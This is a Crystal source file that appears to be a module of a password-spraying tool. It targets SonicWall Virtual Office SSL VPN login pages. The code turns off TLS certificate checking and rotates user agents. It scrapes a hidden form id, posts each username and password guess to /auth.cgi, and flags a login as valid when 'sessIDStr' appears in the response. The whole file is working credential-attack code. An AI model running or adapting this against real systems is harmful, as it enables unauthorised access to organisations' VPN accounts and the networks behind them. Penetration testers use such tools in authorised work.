require "http/client"
require "xml"


class Sonicwall_VirtualOffice < Sprayer

    ## only uncomment if needed
    # def initialize(usernames : Array(String), password : Array(String))
    #     # init any special or default variables here
    #     super()
    # end

    # returns an array of [username, password, valid, lockout, mfa]
    def spray(username : String, password : String) 
        lockedout = false
        valid = false
        mfa = false

        # 
        # enter your auth check here and make sure 
        #
        # if @target.starts_with? "https://"
        #     url = @target.split("https://")[1]
        # elsif @target.starts_with? "http://"
        #     url = @target.split("http://")[1]
        # else 
        #     url = @target
        # end
        url = URI.parse(@target)
        # puts "url: #{url}" 
    
        # context = OpenSSL::SSL::Context::Client.insecure
        context = OpenSSL::SSL::Context::Client.new
        context.verify_mode = OpenSSL::SSL::VerifyMode::NONE

        client = HTTP::Client.new(url, tls: context)
        header = HTTP::Headers{
            # "User-Agent" => "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "User-Agent" => @useragents[rand(0..@useragents.size)],
            "Accept" => "*/*",
            "Accept-Language" => "en-US,en;q=0.5",
            "Accept-Encoding" => "gzip, deflate",
            "Pragma" => "no-cache",
        }

        splashpage = client.get("/auth.html")
        page = XML.parse_html(splashpage.body)
        # page.xpath_nodes("/").each do |node| 
        #     # id = formitems.children()[3].attributes()[2].content()
        #     p node
        # end

        hidden = page.xpath_node("/html/body/center/table/tr/td/table/tr/td/form")
        return if hidden.nil?
        id = hidden.children()[3].attributes()[2].content()
        form = "id=#{id}&domain=LocalDomain&uName=#{username}&pass=#{URI.encode_www_form password}&SslvpnLoginPage=1&digest="
        post = client.post("/auth.cgi", form: form)

        valid = true if post.body.includes? "sessIDStr"





        #
        # end of your auth check here
        # 
        
        return [username, password, valid, lockedout, mfa]
    end
end